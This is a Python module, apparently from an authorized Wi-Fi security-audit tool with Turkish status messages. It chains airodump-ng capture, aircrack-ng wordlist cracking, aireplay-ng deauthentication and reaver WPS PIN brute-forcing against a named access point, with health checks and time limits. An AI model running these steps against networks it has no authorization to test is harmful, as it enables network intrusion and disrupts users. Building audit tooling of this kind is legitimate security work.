"""Bounded wireless steps for an explicitly named AP and test station."""
from __future__ import annotations

import re
import ipaddress
import hashlib
import shutil
import subprocess
from pathlib import Path


MAC = re.compile(r"^(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
IFACE = re.compile(r"^[A-Za-z0-9_.-]{1,30}$")
BUSID = re.compile(r"^[0-9]{1,3}-[0-9]{1,3}$")


def validate(spec: dict) -> dict:
    bssid = str(spec.get("bssid", "")).upper()
    station = str(spec.get("test_station", "")).upper()
    interface = str(spec.get("interface", ""))
    station_ip = str(ipaddress.ip_address(str(spec.get("test_station_ip", ""))))
    busid = str(spec.get("busid", ""))
    channel = int(spec.get("channel", 0))
    if not MAC.fullmatch(bssid) or not MAC.fullmatch(station):
        raise ValueError("BSSID ve test istemcisi MAC adresi gerekli")
    if not IFACE.fullmatch(interface) or not 1 <= channel <= 196:
        raise ValueError("Kablosuz arayuz veya kanal gecersiz")
    if busid and not BUSID.fullmatch(busid):
        raise ValueError("USB BusID gecersiz")
    return {"bssid": bssid, "test_station": station,
            "interface": interface, "channel": channel,
            "test_station_ip": station_ip,
            "busid": busid,
            "ssid": str(spec.get("ssid", ""))[:64],
            "wordlist": str(spec.get("wordlist", ""))}


def monitor_ready(interface: str) -> bool:
    if not shutil.which("iw"):
        return False
    try:
        result = subprocess.run(["iw", "dev", interface, "info"], capture_output=True,
                                text=True, timeout=5, check=False)
        return result.returncode == 0 and bool(re.search(r"(?m)^\s*type\s+monitor\s*$", result.stdout))
    except (OSError, subprocess.TimeoutExpired):
        return False


def run(spec: dict, raw: Path, events: list, command) -> None:
    """The injected command is wizard.command; all budgets are hard caps."""
    spec = validate(spec)
    if not monitor_ready(spec["interface"]):
        events.append({"step": "wireless_preflight", "status": "skipped",
                       "detail": "Kali monitor-mode arayuzu dogrulanamadi"})
        return
    if not shutil.which("airodump-ng"):
        events.append({"step": "wireless_preflight", "status": "missing_tool",
                       "detail": "aircrack-ng araclari kurulu degil"})
        return
    raw.mkdir(parents=True, exist_ok=True)
    capture_prefix = raw / "authorized_ap"
    captured=command("wireless_capture", ["airodump-ng", "--bssid", spec["bssid"],
            "--channel", str(spec["channel"]), "--write", str(capture_prefix),
            "--output-format", "pcap", spec["interface"]], raw, events, 600)
    capture = raw / "authorized_ap-01.cap"
    if captured.get('status')=='timeout' and capture.is_file():
        captured['status']='ok'
        captured['detail']='Planli 10 dakika yakalama sinirinda durduruldu'
    if capture.is_file():
        with capture.open('rb') as handle:
            digest=hashlib.file_digest(handle,'sha256').hexdigest()
        events.append({'step':'wireless_capture_evidence','status':'ok',
                       'output':str(capture.relative_to(raw.parent.parent.parent)),
                       'sha256':digest})
    if spec["wordlist"] and capture.is_file() and shutil.which("aircrack-ng"):
        wordlist = Path(spec["wordlist"]).expanduser().resolve()
        if wordlist.is_file() and not wordlist.is_symlink():
            command("wireless_offline_audit", ["aircrack-ng", "-b", spec["bssid"],
                    "-w", str(wordlist), str(capture)], raw, events, 1800)
        else:
            events.append({"step": "wireless_offline_audit", "status": "skipped",
                           "detail": "Yetkili wordlist bulunamadi"})
    def station_healthy():
        try:
            probe=subprocess.run(['ping','-n','-c','1','-W','1',spec['test_station_ip']],
                                 stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,
                                 timeout=3,check=False)
            return probe.returncode==0
        except (OSError,subprocess.TimeoutExpired):
            return False
    active_allowed=station_healthy()
    if shutil.which("aireplay-ng") and active_allowed:
        for attempt in range(1, 4):
            result = command(f"wireless_deauth_{attempt}", ["aireplay-ng", "--deauth", "1",
                "-a", spec["bssid"], "-c", spec["test_station"], spec["interface"]],
                raw, events, 15)
            if result.get("status") != "ok" or not station_healthy():
                active_allowed=False
                events.append({'step':'wireless_health','status':'blocked',
                               'detail':'Test istemcisi saglik kontrolu basarisiz; aktif islem durduruldu'})
                break
    else:
        events.append({'step':'wireless_deauth','status':'skipped',
                       'detail':'aireplay-ng yok veya test istemcisi ICMP ile dogrulanamadi'})
    if not active_allowed or not station_healthy():
        events.append({"step": "wireless_wps", "status": "skipped",
                       "detail": "Test istemcisi saglik kontrolu basarisiz; WPS denenmedi"})
    elif shutil.which("reaver"):
        result=command("wireless_wps", ["reaver", "-i", spec["interface"], "-b", spec["bssid"],
                "-c", str(spec["channel"]), "-g", "10", "-l", "60"], raw, events, 180,
                stop_on=("WPS locked", "AP rate limiting", "locked"))
        log=raw/'wireless_wps.txt'
        if log.is_file() and 'WPS locked' in log.read_text(encoding='utf-8',errors='replace'):
            result['status']='blocked'
            result['detail']='WPS kilidi goruldu; denemeler durdu'
    else:
        events.append({"step": "wireless_wps", "status": "missing_tool",
                       "detail": "reaver kurulu degil"})
